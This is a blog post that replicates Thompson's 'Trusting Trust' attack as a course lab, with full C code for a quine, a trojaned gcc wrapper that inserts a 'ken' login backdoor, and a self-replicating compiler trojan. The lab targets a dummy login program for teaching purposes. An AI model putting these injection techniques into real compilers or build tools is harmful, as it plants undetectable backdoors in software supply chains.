# Replicating the Thompson Attack

In Ken Thompson's famous paper *Reflections on Trusting Trust*, he introduced an attack that went undetected in the C compiler, which allowed the hacked compiler to compile compromised UNIX login commands. If you haven't read this paper yet, I strongly recommend that you [take a look](https://www.cs.cmu.edu/~rdriley/487/papers/Thompson_1984_ReflectionsonTrustingTrust.pdf). In this post, we will replicate Thompson's attack on a dummy login program.

The starter code was part of Stanford's CS240lx labs created by Dr. Dawson Engler. You can find the lab files [here in the course repo](https://github.com/dddrrreee/cs240lx-20spr/tree/master/labs/1-trusting-trust).

You can find my implementation of the Thompson Attack [here](https://github.com/kaichengyan/trusting-trust-hack).

## Step 1: A Self-Replicating Program

The first step toward a Thompson Attack involves creating a quine, or a self-reproducing program. To be more specific, a quine is a program that when run prints out its own source code.

An example is shown in Fig 1 of the Trusting Trust paper. Our quine is actually a bit different from Thompson's example:

```c
char s[] = {
    47,
    /* lines omitted */
    10,
    0
};

/* Even with some comments. */

#include <stdio.h>

int main() {
    int i;

    printf("char s[] = {\n");
    for(i = 0; s[i]; i++)
        printf("\t%d,\n", s[i]);
    printf("\t0\n};\n\n");
    printf("%s", s);
    return 0;
}
```

We will look at how we can generate such a quine.

The quine contains two parts: the `char s[]` definition and the main body. The contents of `s[]` is the second part of the program, starting from `/* Even` to the final `}`.

To create such a program, we start from the main body, defined in `step1/seed.c`:

```c
/* Even with some comments. */

#include <stdio.h>

int main() {
    int i;

    printf("char s[] = {\n");
    for(i = 0; s[i]; i++)
        printf("\t%d,\n", s[i]);
    printf("\t0\n};\n\n");
    printf("%s", s);
    return 0;
}
```

Note that `seed.c` by itself is not legal code. The definition of `s` is missing, and we will write some code to generate it.

We write another program, `step1/string-to-char-array.c`, that takes input from `stdin`, and prints out a snippet of C code that defines a `char[]` named `s`, whose content is the same as the input.

```c
// convert the contents of stdin to their ASCII values (e.g.,
// '\n' = 10) and spit out the <prog> array used in Figure 1 in
// Thompson's paper.
#include <stdio.h>

int main(void) {
    // put your code here.
    printf("char s[] = {\n");
    int c;
    while ((c = fgetc(stdin)) != EOF) {
        printf("\t%d,\n", c);
    }
    printf("\t0\n};\n\n");
    return 0;
}
```

By combining these two snippets, we can obtain a quine `replicate.c`:

```shell
# Compile string-to-char-array.c
gcc -Og -g -Wall string-to-char-array.c -o string-to-char-array

# Convert seed.c to its char[] definition
./string-to-char-array < seed.c > replicate.c

# Append seed.c itself. Now we have the quine replicate.c.
cat seed.c >> replicate.c
```

When `replicate.c` is run, it will first print out its own `char s[]` definition, and then print out the content of `s`, which is just the content of `seed.c`.

We can compile and run `replicate.c` and see if it really outputs itself:

```shell
# Compile replicate.c
gcc -Og -g -Wall replicate.c -o replicate

# Run replicate
./replicate > kid.c

# The output should be exactly replicate.c's source
diff replicate.c kid.c
```

`kid.c` and `replicate.c` should be identical.

## Step 2 - Hacking the "Compiler"

The second step of Thompson's attack is hacking the compiler. In Thompson's paper, he actually an actual C compiler itself to inject code into the UNIX login program. In our replication, we will also target a specific program `step2/login.c`, but we will not be touching the compiler itself. Instead, we will "hack" a wrapper of `gcc`.

The wrapper is defined in `step2/identity-cc.c`. The program simply makes a copy of the source code (input) and throws the copy to `gcc` without changing it. We will hack this "compiler" by making it *change the source code* while copying it. Specifically, in `step2/trojan-cc1.c`, we will scan for the line `int login(char *user) {` in the source code, and inject this line below it to skip authentication if the username is `ken`:

```c
    if (strcmp(user, "ken") == 0) return 1;
```

Simple enough. But besides simply doing this, we also want to hack the compiler, such that when we use the hacked compiler to compile a new compiler, *the compiled new compiler will also be hacked*. We will leave this part to step 3 as it's fairly complicated. In this step, we will simply add a `printf` statement when compiling a compiler, inside the `compile` function.

The `compile` function in `step2/trojan-cc1.c` looks like this:

```c
static void compile(char *program, char *outname) {
    FILE *fp = fopen("./temp-out.c", "w");
    assert(fp);

    static char compile_sig[] =
            "static void compile(char *program, char *outname) {\n"
            "    FILE *fp = fopen(\"./temp-out.c\", \"w\");\n"
            "    assert(fp);"
            ;
    // inject this after the assert.  not much of an attack.   this is just a quick placeholder.
    static char compile_attack[] = "printf(\"%s:%d: could have run your attack here!!\\n\", __FUNCTION__, __LINE__);";

    static char login_sig[] = "int login(char *user) {";
    static char login_attack[] = "if(strcmp(user, \"ken\") == 0) return 1;";

    // detect the xxx_sig substrings,
    // insert the xxx_attack after it

    fprintf(fp, "%s", program);
    fclose(fp);

    // gross, call gcc.
    char buf[1024];
    sprintf(buf, "gcc ./temp-out.c -o %s", outname);
    if(system(buf) != 0)
        error("system failed\n");
}
```

To insert the `login_attack` code, we simply do some ugly C string manipulation:

```c
    char *login_sig_loc = strstr(program, login_sig);
    if (login_sig_loc != NULL) {
        static char tmp[8*1024*1024 + 1];
        size_t login_attack_offset = login_sig_loc - program + strlen(login_sig);
        strcpy(tmp, program + login_attack_offset);
        strcpy(program + login_attack_offset, login_attack);
        strcpy(program + login_attack_offset + strlen(login_attack), tmp);
    }
```

After doing this, we can compile a hacked `login` program with our hacked compiler `step2/trojan-cc1.c`:

```shell
# First compile our hacked compiler using gcc
gcc -Og -g -Wall -Wno-unused-variable trojan-cc1.c -o trojan-cc1

# Compile login.c with our hacked trojan-cc1 compiler
./trojan-cc1 login.c -o login-attacked

# Run the attacked login program
./login-attacked
```

Now we should be able to log in with the username `ken`, without needing to enter a password:

```text
user: ken
successful login: <ken>
```

Naturally the `compiler_attack` is similar:

```c
    char *compile_sig_loc = strstr(program, compile_sig);
    if (compile_sig_loc != NULL) {
        static char tmp[8*1024*1024 + 1];
        size_t compile_attack_offset = compile_sig_loc - program + strlen(compile_sig);
        strcpy(tmp, program + compile_attack_offset);
        strcpy(program + compile_attack_offset, compile_attack);
        strcpy(program + compile_attack_offset + strlen(compile_attack), tmp);
    }
```

We can do the same thing to compile our identity compiler `identity-cc.c` with our `trojan-cc1` compiler.

```shell
# Compile identity-cc.c with our hacked trojan-cc1 compiler
./trojan-cc1 identity-cc.c -o cc-attacked

# Use the attacked compiler program to compile login.c
./cc-attacked login.c -o login
```

We can see our `printf` message being printed:

```text
compile:18: could have run your attack here!!
```

This is not very interesting. We want the `login` compiled with `cc-attacked` to also have the ability to inject code, but currently `cc-attacked` does nothing special other than printing out this message.

We will look at how to make `cc-attacked` do these more evil things in the next step.

## Step 3 - Making the "Compiler" Self-Replicating

In step 3, we will develop a more powerful version of `step2/trojan-cc1.c`, named `step3/trojan-cc2.c`. As described in the previous step, we want to make the new compiler `cc-attacked` compiled with our `trojan-cc2` compiler to also behave like `trojan-cc2`. In other words, we want `trojan-cc2`'s children (and grandchildren, greatgrandchildren, etc.) to continue to generate hacked compilers and hacked `login` programs. This is tricky, and we will use our `string-to-char-array` technique from step 1.

To achieve this, we will need to insert our attack code from step 2 into the compiler that `trojan-cc2` compiles. Instead of injecting a `printf` statement, we can inject the entire attack code! We place our attack code in `step3/attack.c`:

```c
    // not a very robust finger-print, but what can you do.
    // in a real compiler we would do this match on the parse tree,
    // which strips out some non-essential features.
    static char compile_sig[] =
            "static void compile(char *program, char *outname) {\n"
            "    FILE *fp = fopen(\"./temp-out.c\", \"w\");\n"
            "    assert(fp);"
            ;

    static char login_sig[] = "int login(char *user) {";
    static char login_attack[] = "if(strcmp(user, \"ken\") == 0) return 1;";

    /* your code goes here */
    char *login_sig_loc = strstr(program, login_sig);
    if (login_sig_loc != NULL) {
        static char tmp[8*1024*1024 + 1];
        size_t login_attack_offset = login_sig_loc - program + strlen(login_sig);
        strcpy(tmp, program + login_attack_offset);
        strcpy(program + login_attack_offset, login_attack);
        strcpy(program + login_attack_offset + strlen(login_attack), tmp);
    }

    char *compile_sig_loc = strstr(program, compile_sig);
    if (compile_sig_loc != NULL) {
        static char tmp[8*1024*1024 + 1];
        size_t compile_attack_offset = compile_sig_loc - program + strlen(compile_sig);
        strcpy(tmp, program + compile_attack_offset);
        strcpy(program + compile_attack_offset, compile_attack);
        strcpy(program + compile_attack_offset + strlen(compile_attack), tmp);
    }
```

Note that we have removed the definition for `compile_attack`, since we will be injecting the entire attack code instead! To be able to inject our attack code, we modify our `step1/string-to-char-array.c` to become `step3/generate-attack-array.c`:

```c
// convert the contents of stdin to their ASCII values (e.g.,
// '\n' = 10) and spit out the <prog> array used in Figure 1 in
// Thompson's paper.
#include <stdio.h>

int main(void) {
    // put your code here.
    printf("static char compile_attack[] = {\n");
    int c;
    while ((c = fgetc(stdin)) != EOF) {
        printf("\t%d,\n", c);
    }
    printf("\t0\n};\n\n");
    return 0;
}
```

With this, we can convert our attack code into a `char[]` definition. Now we can simply `#include` it in our attack code:

```c
// make #include appear on new line
#include "attack-array.h"
    // not a very robust finger-print, but what can you do.
    // in a real compiler we would do this match on the parse tree,
    // which strips out some non-essential features.
    static char compile_sig[] =
            "static void compile(char *program, char *outname) {\n"
            "    FILE *fp = fopen(\"./temp-out.c\", \"w\");\n"
            "    assert(fp);"
            ;

    static char login_sig[] = "int login(char *user) {";
    static char login_attack[] = "if(strcmp(user, \"ken\") == 0) return 1;";

    /* your code goes here */
    char *login_sig_loc = strstr(program, login_sig);
    if (login_sig_loc != NULL) {
        static char tmp[8*1024*1024 + 1];
        size_t login_attack_offset = login_sig_loc - program + strlen(login_sig);
        strcpy(tmp, program + login_attack_offset);
        strcpy(program + login_attack_offset, login_attack);
        strcpy(program + login_attack_offset + strlen(login_attack), tmp);
    }

    char *compile_sig_loc = strstr(program, compile_sig);
    if (compile_sig_loc != NULL) {
        static char tmp[8*1024*1024 + 1];
        size_t compile_attack_offset = compile_sig_loc - program + strlen(compile_sig);
        strcpy(tmp, program + compile_attack_offset);
        strcpy(program + compile_attack_offset, compile_attack);
        strcpy(program + compile_attack_offset + strlen(compile_attack), tmp);
    }
```

With the new `#include` macro added, we need to run `generate-attack-array` again to update our
`compile_attack` definition. Now in our `trojan-cc2.c`, we can simply include our attack code using `#include "attack.c"`:

```c
static void compile(char *program, char *outname) {
    FILE *fp = fopen("./temp-out.c", "w");
    assert(fp);

#include "attack.c"

    fprintf(fp, "%s", program);
    fclose(fp);

    // gross, call gcc.
    char buf[1024];
    sprintf(buf, "gcc ./temp-out.c -o %s", outname);
    if(system(buf) != 0)
        error("system failed\n");
}
```

And it's done! To verify that it works, we can run the following:

```shell
# Compile trojan-cc2.c
gcc -Og -g -Wall -Wno-unused-variable trojan-cc2.c -o trojan-cc2

# Use trojan-cc2 to compile the clean compiler
./trojan-cc2 ../step2/identity-cc.c -o cc-attacked

# Use cc-attacked to compile the clean compiler
./cc-attacked ../step2/identity-cc.c -o cc-attacked2

# Compare the binaries -- it's ok if they don't match,
# as long as the next step works!
diff cc-attacked cc-attacked2

# Compile the login program with cc-attacked2
./cc-attacked2 ../step2/login.c -o login-attacked

# Run the login program
./login-attacked
```

And when we enter `ken` as the username, we log in successfully!

```text
user: ken
successful login: <ken>
```

What have we achieved? Now we have a compiler binary that even when given clean virgin compiler source code, will still produce hacked binaries. As long as people use prebuilt binaries to build next-version compilers, the hack will remain forever in the system compiler, undetected.
